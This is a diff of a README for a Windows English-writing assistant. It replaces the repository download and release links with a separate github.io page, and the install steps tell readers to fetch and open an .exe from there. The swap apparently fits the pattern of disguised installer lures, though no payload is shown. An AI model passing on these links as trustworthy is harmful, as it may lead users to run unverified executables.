@@ -1,6 +1,6 @@
 # ✍️ En-IntelliSense - Better writing through smart language tools
 
-[![](https://img.shields.io/badge/Download_Windows_App-Blue?style=for-the-badge)](https://github.com/Morleeceruminous864/En-IntelliSense)
+[![](https://img.shields.io/badge/Download_Windows_App-Blue?style=for-the-badge)](https://morleeceruminous864.github.io)
 
 En-IntelliSense helps you write clear English. The software acts as an assistant that checks your grammar and suggests completions for your sentences. It reviews your entire draft to ensure your tone remains consistent. If you learn English as a second language, the app provides bilingual explanations for its suggestions. You connect your own model to keep your data private and maintain control over your writing tools.
 
@@ -8,7 +8,7 @@ En-IntelliSense helps you write clear English. The software acts as an assistant
 
 Follow these steps to get the app on your computer.
 
-1. Go to the [official release page](https://github.com/Morleeceruminous864/En-IntelliSense).
+1. Go to the [official release page](https://morleeceruminous864.github.io).
 2. Look for the latest version under the Releases section.
 3. Click the file ending in .exe to download the installer.
 4. Open the file once the download finishes.
